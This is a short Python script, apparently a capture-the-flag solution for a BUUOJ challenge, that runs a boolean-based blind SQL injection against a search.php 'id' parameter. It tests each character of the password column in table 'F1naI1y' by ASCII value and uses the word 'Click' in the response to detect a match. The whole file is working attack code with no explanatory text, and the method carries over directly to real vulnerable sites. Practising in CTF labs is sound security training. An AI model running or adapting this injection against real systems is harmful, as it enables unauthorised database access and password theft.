import requests

url="http://0a9fd7ad-42b5-4041-90d8-73b02f1815d3.node4.buuoj.cn:81/search.php?id="
name =''
for i in range(1,45):
    for j in range(34,128):
        next = "(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%d)"

        Url = url+next%(i,j)
        print(Url)
        result = requests.get(Url)
        if 'Click' in result.text:
            name+= chr(j)
            print(name)
            break

